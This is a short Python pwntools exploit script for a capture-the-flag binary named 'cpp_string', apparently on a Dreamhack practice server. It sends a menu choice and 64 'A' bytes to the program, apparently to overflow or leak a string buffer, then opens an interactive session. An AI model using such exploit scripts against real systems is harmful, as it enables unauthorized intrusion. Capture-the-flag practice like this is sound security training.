#!/usr/bin/python3

from pwn import *

exe = ELF("./cpp_string")

context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
# def GDB():
#     if not args.REMOTE:
#         gdb.attach(p, gdbscript='''
#         b*

#         c
#         ''')
#         input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 9810)
else:
    p = process([exe.path])
# GDB()

sla(b' input : ', b'2')
sla(b'contents : ', b'A'*64)
sla(b' input : ', b'1')
sla(b' input : ', b'3')





p.interactive()

